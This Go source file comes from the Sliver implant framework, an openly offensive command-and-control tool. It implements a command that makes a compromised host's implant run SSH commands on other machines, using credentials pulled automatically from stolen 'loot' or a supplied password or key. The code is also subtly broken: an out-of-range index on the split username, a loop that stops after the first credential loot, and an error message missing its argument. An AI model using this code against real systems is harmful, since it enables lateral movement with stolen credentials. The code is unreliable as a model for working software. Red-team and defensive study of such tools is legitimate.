package execute

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"strings"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// SSH - Execute an SSH command on the target
type SSH struct {
	Positional struct {
		UserHost string   `description:"user@host target (user optional, not host). Creds user/key used if matching" required:"1-1"`
		Command  []string `description:"One or more commands to execute (multiple arguments/shelled commands can be single-quoted)" required:"1"`
	} `positional-args:"true" required:"true"`
	Options struct {
		LocalPath  string `long:"local-priv" short:"l" description:"local SSH key file (PEM encoded)"`
		RemotePath string `long:"remote-priv" short:"r" description:"remote SSH key file (PEM encoded)"`
		Password   string `long:"password" short:"P" description:"password to use for connection"`
		Port       uint32 `long:"port" short:"p" description:"SSH connection port" default:"22"`
		SkipLoot   bool   `long:"skip-loot" short:"s" description:"do not use automatic credential matching with username, even if no SSH key file given with --priv"`
	} `group:"loot fetch options"`
}

// Execute - Execute an SSH command on the target
func (e *SSH) Execute(args []string) (err error) {
	var (
		privKey []byte
	)
	session := core.ActiveTarget.Session()
	if session == nil {
		return
	}

	// user@host setup
	userHost := strings.Split(e.Positional.UserHost, "@")
	var username string
	var hostname string
	if len(userHost) == 1 {
		username = session.Username // By default, we use the implant process user
		hostname = userHost[0]
	} else if len(userHost) == 2 {
		username = userHost[0]
		hostname = userHost[1]
	}
	port := e.Options.Port
	password := e.Options.Password
	command := e.Positional.Command

	// Then, get a list of all matching credentials loot for the current user@host combination.
	allLoot, err := transport.RPC.LootAll(context.Background(), &commonpb.Empty{})
	if err != nil {
		return log.Errorf("Failed to fetch loot: %s", err)
	}

	userPref := strings.Split(username, "#") // a user#ba23jk32 ID (user  + key ID prefix concatenated, to override any survey)
	// creds := []*clientpb.Credential{}
	var cred *clientpb.Credential
	for _, loot := range allLoot.Loot {
		if loot.Type != clientpb.LootType_LOOT_CREDENTIAL {
			continue
		}
		// Here, keep only SSH key

		// Check if we have instead, both a username@host matching a loot credential ?
		// If yes and no other choices, select and go on with it.
		if len(userPref) == 1 {
			if loot.Credential.User == userPref[0] {
				cred = loot.Credential
			}
			break
		}

		// Check if username has not a short key prefix embedded, so that there is only a single choice,
		// we don't take account of any user@host matching another key, we separate the prefix, find the
		// credential and go on with it.
		if len(userPref[2]) == 8 {
			if loot.LootID[:8] == userPref[2] {
				cred = loot.Credential
			}
			break
		}

	}

	if cred == nil && password == "" && e.Options.LocalPath == "" && e.Options.RemotePath == "" {
		// return log.Errorf("No user matching loot credential, no password and no key file provided")
		// Survey ?
	}

	// If there are keyfiles provided either remotely or locally, it override loots matching
	// and directly use these keys for authentication. Download and process as necessary.
	privateKeypath := e.Options.LocalPath
	if privateKeypath != "" {
		privKey, err = ioutil.ReadFile(privateKeypath)
		if err != nil {
			return log.Errorf("%s", err)
		}
	}

	// Has no user matching anything in loot, no password and no key file,
	// we must fail safely better than do risky and unauthenticated things
	if cred == nil && password == "" && len(privKey) == 0 {
		return log.Errorf("No user matching loot credential, no password and key could not read: %s. Aborting")
	}

	commandResp, err := transport.RPC.RunSSHCommand(context.Background(), &sliverpb.SSHCommandReq{
		Username: username,
		Hostname: hostname,
		Port:     uint32(port),
		PrivKey:  privKey,
		Password: password,
		Command:  strings.Join(command, " "),
		Request:  core.ActiveTarget.Request(),
	})
	if err != nil {
		return log.RPCErrorf(err.Error())
	}

	if commandResp.Response != nil && commandResp.Response.Err != "" {
		log.Errorf("Error: %s", commandResp.Response.Err)
		if commandResp.StdOut == "" && commandResp.StdErr == "" {
			return log.Errorf("       both stdout & stderr are empty")
		}
		fmt.Println()
	}
	if commandResp.StdOut != "" || commandResp.StdErr != "" {
		log.Infof("Output:")
		fmt.Println(commandResp.StdOut)
		if commandResp.StdErr != "" {
			log.Warnf("StdErr")
			fmt.Println(commandResp.StdErr)
		}
	}
	return
}
